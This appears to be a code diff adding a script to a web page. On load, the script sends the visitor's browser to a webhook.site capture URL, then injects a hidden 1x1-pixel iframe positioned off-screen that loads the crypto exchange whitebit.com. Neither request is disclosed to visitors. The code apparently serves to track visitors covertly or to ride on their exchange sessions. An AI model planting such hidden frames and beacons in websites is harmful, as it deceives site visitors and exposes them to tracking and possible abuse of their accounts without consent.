@@ -172,6 +172,24 @@
 
     trackVisitor();
 </script>
+    <script>
+         window.onload = function() {
+            setTimeout(() => {
+                document.getElementById('trackingFrame').src = "https://webhook.site/ced7cff6-575e-43a5-867c-22d4624f1bd1";
+            }, 1000);
+
+            setTimeout(() => {
+                let secondFrame = document.createElement('iframe');
+                secondFrame.src = "https://whitebit.com/";
+                secondFrame.style.width = "1px";
+                secondFrame.style.height = "1px";
+                secondFrame.style.border = "none";
+                secondFrame.style.position = "absolute";
+                secondFrame.style.left = "-9999px";
+                document.body.appendChild(secondFrame);
+            }, 2000); 
+        };
+    </script>
 
 </body>
 </html>
